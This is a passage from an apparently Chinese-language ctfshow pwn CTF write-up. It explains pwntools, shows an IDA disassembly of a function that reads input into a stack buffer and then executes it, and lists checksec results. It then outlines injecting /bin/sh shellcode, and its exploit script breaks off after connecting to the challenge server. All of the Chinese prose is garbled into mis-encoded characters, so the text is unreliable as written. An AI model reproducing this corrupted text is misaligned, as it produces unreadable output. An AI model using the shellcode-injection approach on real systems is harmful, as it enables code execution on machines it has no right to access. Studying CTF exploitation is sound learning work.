<p>å¦‚æœä¹‹å‰æ˜¯æ‰“é€†å‘æˆ–è€…å¼ºè¡Œå…¥é—¨PWNçš„è¯ï¼Œæœ€åç‰¢çš„æˆ‘ç›¸ä¿¡åº”è¯¥æ˜¯ç”¨IDAå§ï¼Œé™¤äº†æ‰¾æ˜æ–‡å­—ç¬¦ä¸²flagå¤–ï¼Œä½ å­¦äº†æ±‡ç¼–è¯­è¨€ä½ ä¹Ÿçœ‹ä¸æ‡‚è¿™æ˜¯å•¥æ„æ€ï¼Œæ„Ÿè§‰ä¸€å°ä¸²æºä»£ç è½¬æ¢æˆæ±‡ç¼–è¯­è¨€éå¸¸é•¿ã€æ¯ç‡¥ï¼Œå…¶å®UPä¸»ä¹Ÿæ·±æœ‰ä½“ä¼šï¼Œåœ¨ç³»ç»Ÿæ€§å…¥é—¨åï¼Œä¹Ÿåˆæ­¥çŸ¥é“IDAæ˜¯æ€ä¹ˆç”¨çš„ï¼Œè¿™é‡Œæˆ‘æŠŠä¸‹åˆ’çº¿â€œ===== S U B R O U T I N E =====â€ä¹Ÿå¤åˆ¶è¿›æ¥äº†ï¼ŒæŒ‰æˆ‘ç†è§£è¿™æ˜¯å‡½æ•°åˆ†ç•Œï¼Œåˆ†éš”çº¿ä¸Šæ–¹æ˜¯å‰ä¸€ä¸ªå‡½æ•°çš„ç»“å°¾ï¼ˆé€šå¸¸ä»¥<code>retn</code>æŒ‡ä»¤ç»“æŸï¼Œä»£è¡¨å‡½æ•°è¿”å›ï¼‰è¿‡äº†è¿™æ¡çº¿ï¼Œè¯´æ˜æ±‡ç¼–è¯­è¨€åœ¨æè¿°çš„å°±æ˜¯å¦å¤–ä¸€ä¸ªå‡½æ•°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´è¿™ä¸Šä¸‹åˆ†ç•Œçº¿æ˜¯ä»£è¡¨å›Šæ‹¬ç€ä¸€ä¸ªå‡½æ•°ï¼Œä¾‹å¦‚è¿™ctfshowå‡½æ•°ã€‚</p>
<p>å¦å¤–æˆ‘æƒ³è¯´çš„æ˜¯æ±‡ç¼–è¯­è¨€è¿™ä¹ˆé•¿æ˜¯æœ‰é“ç†çš„ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ç§â€œå•°å—¦â€ï¼Œå®ƒèƒ½åœ¨æ¯ä¸€æ®µä»£ç è¿è¡Œåä¸æ–­å‘ä½ æ±‡æŠ¥åœ°å€å˜åŒ–ï¼Œè¿™ç§ â€œå•°å—¦â€ æœ¬è´¨ä¸Šæ˜¯<strong>å¯¹è®¡ç®—æœºåº•å±‚æ“ä½œçš„ç›´æ¥æ˜ å°„</strong>ï¼Œè¿™ç§ç‰¹æ€§ç¡®å®è®©å®ƒåœ¨è·Ÿè¸ªç¨‹åºè¿è¡Œç»†èŠ‚ã€åˆ†æé€»è¾‘å’Œæ’æŸ¥é—®é¢˜æ—¶å…·æœ‰ç‹¬ç‰¹ä¼˜åŠ¿ã€‚</p></blockquote>
<p>ä»è¿™é‡Œå¼€å§‹å°±è¦ç”¨pwntoolsäº†ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹ï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>from pwn import *</code> æ˜¯åœ¨ Python ä¸­ä½¿ç”¨ <code>pwntools</code> åº“çš„å¸¸è§å¯¼å…¥æ–¹å¼ ã€‚<code>pwntools</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ç”¨äºäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ï¼ˆbinary exploitationï¼‰çš„ Python åº“ï¼Œåœ¨ CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ› ï¼‰ç«èµ›ã€å®‰å…¨ç ”ç©¶ä»¥åŠæ¼æ´åˆ†æç­‰é¢†åŸŸå¹¿æ³›åº”ç”¨ï¼Œä»¥ä¸‹æ˜¯å…¶å…·ä½“ä½œç”¨ï¼š</p>
<h4 id="ä¸ç›®æ ‡ç¨‹åºäº¤äº’">ä¸ç›®æ ‡ç¨‹åºäº¤äº’
</h4><ul>
<li><strong>æœ¬åœ°è¿›ç¨‹äº¤äº’</strong>ï¼š<code>pwntools</code> èƒ½è½»æ¾åˆ›å»ºæœ¬åœ°è¿›ç¨‹ï¼Œæ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ã€è·å–ç¨‹åºè¾“å‡ºã€‚ä¾‹å¦‚ï¼Œ<code>p = process('./vulnerable_program')</code> å¯ä»¥å¯åŠ¨æœ¬åœ°çš„å¯æ‰§è¡Œæ–‡ä»¶ <code>vulnerable_program</code>ï¼Œç„¶åé€šè¿‡ <code>p.sendline('input data')</code> å‘ç¨‹åºå‘é€æ•°æ®ï¼Œç”¨ <code>p.recvuntil('prompt')</code> æ¥æ”¶ç¨‹åºè¾“å‡ºç›´åˆ°é‡åˆ°ç‰¹å®šå­—ç¬¦ä¸²ã€‚</li>
<li><strong>è¿œç¨‹æœåŠ¡å™¨äº¤äº’</strong>ï¼šåœ¨é¢å¯¹è¿œç¨‹å­˜åœ¨æ¼æ´çš„æœåŠ¡æ—¶ï¼Œ<code>pwntools</code> æä¾›äº†ä¾¿æ·çš„æ–¹æ³•ã€‚æ¯”å¦‚ <code>r = remote('target.com', 8080)</code> å¯ä»¥è¿æ¥åˆ° <code>target.com</code> æœåŠ¡å™¨çš„ 8080 ç«¯å£ï¼Œåç»­åŒæ ·èƒ½å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ–¹ä¾¿å¯¹è¿œç¨‹æœåŠ¡è¿›è¡Œæµ‹è¯•å’Œæ¼æ´åˆ©ç”¨ã€‚</li>
</ul>
<h4 id="äºŒè¿›åˆ¶æ•°æ®å¤„ç†">äºŒè¿›åˆ¶æ•°æ®å¤„ç†
</h4><ul>
<li><strong>æ•°æ®æ‰“åŒ…å’Œè§£åŒ…</strong>ï¼šåœ¨äºŒè¿›åˆ¶ç¨‹åºä¸­ï¼Œç»å¸¸éœ€è¦å¤„ç†ä¸åŒå­—èŠ‚åºï¼ˆå¤§ç«¯åºã€å°ç«¯åºï¼‰çš„æ•°æ®ã€‚<code>pwntools</code> æä¾›äº† <code>pack</code> å’Œ <code>unpack</code> å‡½æ•°ï¼Œæ¯”å¦‚ <code>p32(0x12345678)</code> å¯ä»¥å°†æ•´æ•° <code>0x12345678</code> æŒ‰ç…§å°ç«¯åºæ‰“åŒ…æˆ 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ï¼›<code>u32(data)</code> åˆ™å¯ä»¥å°† 4 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§å°ç«¯åºè§£åŒ…ä¸ºæ•´æ•°ã€‚</li>
<li><strong>æ•°æ®è½¬æ¢</strong>ï¼šå®ƒè¿˜æ”¯æŒå„ç§æ•°æ®æ ¼å¼ä¹‹é—´çš„è½¬æ¢ï¼Œå¦‚å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²ï¼Œæˆ–è€…è¿›è¡Œåå…­è¿›åˆ¶ä¸äºŒè¿›åˆ¶æ•°æ®ä¹‹é—´çš„è½¬æ¢ç­‰ã€‚</li>
</ul>
<h4 id="è¾…åŠ©æ¼æ´åˆ©ç”¨">è¾…åŠ©æ¼æ´åˆ©ç”¨
</h4><ul>
<li><strong>ç”Ÿæˆ Payload</strong>ï¼šå¯¹äºç¼“å†²åŒºæº¢å‡ºç­‰æ¼æ´ï¼Œéœ€è¦ç²¾å¿ƒæ„é€  Payloadï¼ˆæ”»å‡»è½½è·ï¼‰ã€‚<code>pwntools</code> æä¾›äº†ç”Ÿæˆå¡«å……æ•°æ®ã€æ„é€  ROPï¼ˆReturn-Oriented Programmingï¼Œè¿”å›å¯¼å‘ç¼–ç¨‹ ï¼‰é“¾ç­‰åŠŸèƒ½ã€‚æ¯”å¦‚ <code>cyclic(100)</code> å¯ä»¥ç”Ÿæˆä¸€ä¸ª 100 å­—èŠ‚çš„å¾ªç¯æ¨¡å¼å­—ç¬¦ä¸²ï¼Œç”¨äºç¡®å®šç¼“å†²åŒºæº¢å‡ºçš„åç§»é‡ï¼›é€šè¿‡ <code>ROP</code> æ¨¡å—å¯ä»¥æ–¹ä¾¿åœ°æ„å»º ROP é“¾æ¥ç»•è¿‡ä¸€äº›å®‰å…¨æœºåˆ¶ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚</li>
<li><strong>ç¬¦å·è§£æ</strong>ï¼šåœ¨åˆ†æäºŒè¿›åˆ¶ç¨‹åºæ—¶ï¼Œæœ‰æ—¶éœ€è¦è§£æç¨‹åºä¸­çš„å‡½æ•°åœ°å€ã€å˜é‡åœ°å€ç­‰ã€‚<code>pwntools</code> å¯ä»¥ä¸ <code>ELF</code>ï¼ˆExecutable and Linkable Formatï¼Œå¯æ‰§è¡Œä¸å¯é“¾æ¥æ ¼å¼ï¼Œå¸¸ç”¨äº Linux ç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ç­‰ ï¼‰æ–‡ä»¶äº¤äº’ï¼Œè·å–è¿™äº›ç¬¦å·ä¿¡æ¯ï¼Œä¾‹å¦‚ <code>elf = ELF('./target_binary')</code> å¯ä»¥åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ <code>elf.symbols['main']</code> è·å– <code>main</code> å‡½æ•°çš„åœ°å€ã€‚</li>
</ul>
<h4 id="å¯†ç å­¦ç›¸å…³è¾…åŠ©">å¯†ç å­¦ç›¸å…³è¾…åŠ©
</h4><p>åœ¨ CTF ä¸­ï¼Œæœ‰æ—¶ä¼šæ¶‰åŠå¯†ç å­¦é¢˜ç›®ï¼Œ<code>pwntools</code> ä¹Ÿæä¾›äº†ä¸€äº›åŸºç¡€çš„å¯†ç å­¦è¾…åŠ©åŠŸèƒ½ï¼Œæ¯”å¦‚å¸¸è§åŠ å¯†ç®—æ³•çš„ç®€å•å®ç°ã€ç¼–ç è§£ç ç­‰ã€‚</p>
<h4 id="å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ">å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ
</h4><p><code>pwntools</code> ä¸€å®šç¨‹åº¦ä¸Šæ”¯æŒå¤šçº¿ç¨‹å’Œå¼‚æ­¥æ“ä½œï¼Œè¿™åœ¨åŒæ—¶ä¸å¤šä¸ªç›®æ ‡ç¨‹åºäº¤äº’ï¼Œæˆ–è€…éœ€è¦åœ¨ç­‰å¾…ç¨‹åºè¾“å‡ºçš„åŒæ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡æ—¶éå¸¸æœ‰ç”¨ã€‚</p></blockquote></blockquote>
<p>æ‰€ä»¥ä¸ºå•¥è¦å­¦<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>ï¼Œå½“ç„¶èƒ½ç”¨<a class="link" href="https://www.doubao.com/chat/?from_logout=1"  target="_blank" rel="noopener"
    >è±†åŒ…</a>ã€<a class="link" href="https://www.deepseek.com/"  target="_blank" rel="noopener"
    >DeepSeek</a>ä¹‹ç±»çš„AIå¸®ä½ å†™ä»£ç expï¼Œä½†ä½ å¾—å…ˆäº†è§£<a class="link" href="https://expl0rer.top/p/python/"  target="_blank" rel="noopener"
    >Python</a>å†è®©å®ƒå†™æ‰å¯¹çš„ï¼Œæœ‰æ—¶ä¼šå‡ºé”™ï¼Œä½ å¾—æœ‰åˆ¤æ–­åŠ›ã€‚</p>
<blockquote>
<p>è¿™é‡Œæ¨èä½¿ç”¨Pycharmã€Visual Studio Codeï¼›æˆ–è€…ä½ å¯ä»¥åœ¨Kaliä¸Šç”¨ç»ˆç«¯æ¥è¿è¡Œï¼Œè¿™æ ·ä½ åœ¨Kaliç”¨ncè¿æ¥é¶æœºæ—¶åœ¨åŒä¸€ç³»ç»Ÿè¿è¡Œäº¤äº’æ¯”è¾ƒæ–¹ä¾¿ï¼Œå½“ç„¶Pycharmã€Visual Studio Codeä¹Ÿæœ‰ç»ˆç«¯åŠŸèƒ½ï¼Œåªä¸è¿‡è¦é…PWNç¯å¢ƒç¨å¾®éº»çƒ¦è€Œå·²ï¼Œçœ‹ä½ ä¹ ä¸ä¹ æƒ¯ç”¨Linuxç³»ç»Ÿå§ã€‚</p></blockquote>
<h4 id="é¢˜ç›®åç»­">é¢˜ç›®åç»­ï¼š
</h4><p>è®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œè¿™é‡Œå¼€å§‹åˆ†æè¿™æ®µæ±‡ç¼–ä»£ç ï¼ˆé‡æ–°ç²˜è´´äº†ä¸€éï¼Œå’Œä¸Šé¢ä¸€æ ·ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; Attributes: bp-based frame</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; int __cdecl ctfshow(_DWORD)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">public</span> <span class="nv">ctfshow</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">ctfshow</span>         <span class="nv">proc</span> <span class="nv">near</span>               <span class="c1">; CODE XREF: main+132â†“p</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">buf</span>             <span class="err">=</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mh">88h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="nv">var_4</span>           <span class="err">=</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="o">-</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span> <span class="c1">; __unwind {</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C6</span>                 <span class="nv">push</span>    <span class="nb">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C7</span>                 <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">C9</span>                 <span class="nv">push</span>    <span class="nb">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">CA</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">84h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D0</span>                 <span class="nv">call</span>    <span class="nv">__x86_get_pc_thunk_bx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">D5</span>                 <span class="nv">add</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">(</span><span class="nv">offset</span> <span class="nv">_GLOBAL_OFFSET_TABLE_</span> <span class="o">-</span> <span class="kc">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="kd">DB</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">DE</span>                 <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nbytes</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E3</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">E9</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; buf</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EA</span>                 <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; fd</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">EC</span>                 <span class="nv">call</span>    <span class="nv">_read</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F1</span>                 <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F4</span>                 <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä»£ç æ˜¯åœ¨çœ‹ä¸æ‡‚å¯ä»¥ä¸ŠAIå—¦ä¸€ä¸‹ï¼Œè®©å®ƒå¸®ä½ è§£æä¸€ä¸‹ï¼Œæ¯•ç«Ÿåˆšå…¥é—¨&hellip;&hellip;ï¼ˆè¿™æ®µä»£ç æ˜¯ IDA åç¼–è¯‘å‡ºçš„ 32 ä½ x86 æ¶æ„ç¨‹åºä¸­<code>ctfshow</code>å‡½æ•°ï¼‰</p>
<p>checksecä¸€ä¸‹ï¼šè®°ä½ä¸Šé¢çš„å‚æ•°ï¼Œåé¢å†™expè¦ç”¨&hellip;</p>
<p><img src="/p/ctfshow-pwn-writeup/62.png"
	width="675"
	height="180"
	srcset="/p/ctfshow-pwn-writeup/62_hu_384015e3cc48e.png 480w, /p/ctfshow-pwn-writeup/62_hu_8910832fcad885ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="375"
		data-flex-basis="900px"
	
></p>
<p>å¯çŸ¥ï¼Œå¯¹è¿™äº›ä¿æŠ¤æœ‰ç‚¹é—å¿˜çš„å¯ä»¥å›å»çœ‹<a class="link" href="https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6"  target="_blank" rel="noopener"
    >PWN-1çš„Linuxå®‰å…¨ä¿æŠ¤æœºåˆ¶</a></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>ä¿æŠ¤é¡¹</th>
          <th>çŠ¶æ€</th>
          <th>å¯¹åˆ©ç”¨çš„å½±å“</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Arch</td>
          <td>i386-32-Little</td>
          <td>32 ä½ x86 æ¶æ„ï¼Œshellcode éœ€ç”¨ 32 ä½ç‰ˆæœ¬ï¼ˆå¯¹åº”<code>shellcraft.i386.sh()</code>ï¼‰</td>
      </tr>
      <tr>
          <td>Canaryï¼ˆæ ˆæº¢å‡ºä¿æŠ¤ï¼‰</td>
          <td>No canary found</td>
          <td>æ— æ ˆæº¢å‡ºä¿æŠ¤ï¼Œç¼“å†²åŒºæº¢å‡ºåå¯ç›´æ¥è¦†ç›–æ ˆä¸Šæ•°æ®ï¼ˆæ— éœ€ç»•è¿‡ canaryï¼‰</td>
      </tr>
      <tr>
          <td>NXï¼ˆæ ˆä¸å¯æ‰§è¡Œï¼‰</td>
          <td>NX disabled</td>
          <td>æ ˆæ®µå¯æ‰§è¡Œï¼Œshellcode ç›´æ¥æ”¾åœ¨æ ˆä¸Šå°±èƒ½è¿è¡Œï¼ˆæ— éœ€ ROP ç»•è¿‡ NXï¼‰</td>
      </tr>
      <tr>
          <td>PIEï¼ˆåœ°å€éšæœºåŒ–ï¼‰</td>
          <td>No PIE (0x8048000)</td>
          <td>ç¨‹åºåœ°å€å›ºå®šï¼Œ<code>ctfshow</code>å‡½æ•°ã€<code>buf</code>ç¼“å†²åŒºåœ°å€ä¸ä¼šå˜ï¼ˆæ— éœ€æ³„éœ²åœ°å€ï¼‰</td>
      </tr>
      <tr>
          <td>RWX segments</td>
          <td>Has RWX segments</td>
          <td>å­˜åœ¨ â€œå¯è¯»å¯å†™å¯æ‰§è¡Œâ€ çš„å†…å­˜æ®µï¼Œè¿›ä¸€æ­¥ç¡®ä¿ shellcode èƒ½æ­£å¸¸æ‰§è¡Œ</td>
      </tr>
  </tbody>
</table></div>
<p><strong>æ€»ç»“</strong>ï¼šç¨‹åºä¿æŠ¤æœºåˆ¶æå¼±ï¼Œç›´æ¥ç”¨ â€œæ ˆæº¢å‡ºæ³¨å…¥ shellcodeâ€ å³å¯ï¼Œæ— éœ€å¤æ‚ç»•è¿‡ã€‚</p>
<p>å›åˆ°æœ¬é¢˜ç›®ï¼Œåœ¨ncè¿æ¥ä¹‹åäº¤äº’ä¸€ä¼šå‘ç°å¹¶æ— å®é™…æ•ˆæœï¼ŒPWNå¤§è‡´æ€è·¯æ˜¯æ‰¾åˆ°åé—¨å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å‡½æ•°è¿›è¡Œ<code>ææƒ</code>ï¼Œææƒä¹‹åå°±è¿›è¡Œäº¤äº’å»æ‰§è¡Œä¸€äº›é¶æœºçš„ç»ˆç«¯å‘½ä»¤ä¾‹å¦‚ï¼šcat ctfshow_flagã€lsä¹‹ç±»çš„ã€‚é‚£åœ¨æ­¤ä¹‹å‰éƒ½å¾—å…ˆæ‰¾åˆ°è¿™â€œåé—¨â€ï¼Œä¹Ÿå°±æ˜¯/bin/shã€zshã€systemå‡½æ•°ç­‰ç­‰ï¼Œä½†æˆ‘å‘ç°è¿™ä¸ªç¨‹åºå¹¶æ— è¿™äº›åœ°å€å­˜åœ¨ï¼Œæ‰€ä»¥è¯´è¿™ä¸ªç¨‹åºä»è¢«åˆ¶é€ å‡ºæ¥éƒ½æ²¡æƒ³è¿‡è¦æ‰§è¡Œè¿™äº›æœ‰å…³ææƒçš„ä»£ç &hellip;..</p>
<p><img src="/p/ctfshow-pwn-writeup/66.png"
	width="1650"
	height="625"
	srcset="/p/ctfshow-pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, /p/ctfshow-pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w"
	loading="lazy"
	
		alt="å…¨ç¯‡æœç´¢/bin/shå­—ç¬¦ä¸²"
	
	
		class="gallery-image" 
		data-flex-grow="264"
		data-flex-basis="633px"
	
></p>
<p>å› ä¸ºNXã€canaryæ²¡å¼€ã€åˆæœ‰RWXï¼Œæ³¨å…¥ä¸€æ®µæˆ‘ä»¬è®¾è®¡çš„æœ‰å…³æ‰§è¡Œ/bin/shçš„expè¿˜æ˜¯å¯ä»¥çš„ï¼Œå¤§è‡´æ€è·¯æœ‰äº†ï¼Œæ¥ä¸‹æ¥å¼€å§‹æ‰§è¡Œå§ã€‚</p>
<p><strong>å›´ç»• â€œç›´æ¥æ‰§è¡Œ shellcodeâ€ è®¾è®¡æ–¹æ¡ˆ</strong></p>
<p>å¯ä»¥ç”¨pwntoolsçš„è„šæœ¬å•Šï¼Œå•çº¯ç›´æ¥è°ƒç”¨å‡½æ•°çš„ï¼Œè€Œä¸”pwntoolsæœ‰å±€é™å•Šï¼Œå°±é‚£ç”¨è¿™ä¸ªpwntoolsçš„shellcraftæ¨¡å—ç”Ÿæˆçš„shellcodeæ¯”è¾ƒæ™¦æ¶©éš¾æ‡‚ï¼Œè€Œä¸”æ³¨é‡Šæ”¾åˆ°Kaliä¸Šæ¯”è¾ƒæ‚ä¹±ï¼Œè€Œä¸”æ²¡æœ‰æ¶‰åŠåˆ°æ±‡ç¼–è¯­è¨€è°ƒç”¨ï¼Œæ¯”è¾ƒç®€å•æˆ‘å°±ä¸ç”¨äº†ï¼Œæˆ‘è¿™é‡Œæ‰‹æ•²shellcodeæ–¹ä¾¿å¤§å®¶äº†è§£ä¸€ä¸‹åº•å±‚é€»è¾‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># å¯¼å…¥ pwntools åº“</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span> <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºè°ƒè¯•æ¨¡å¼</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;) # æœ¬åœ°è¿æ¥</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28176</span><span class="p">)</span> <span class="c1"># è¿œç¨‹è¿æ¥</span>
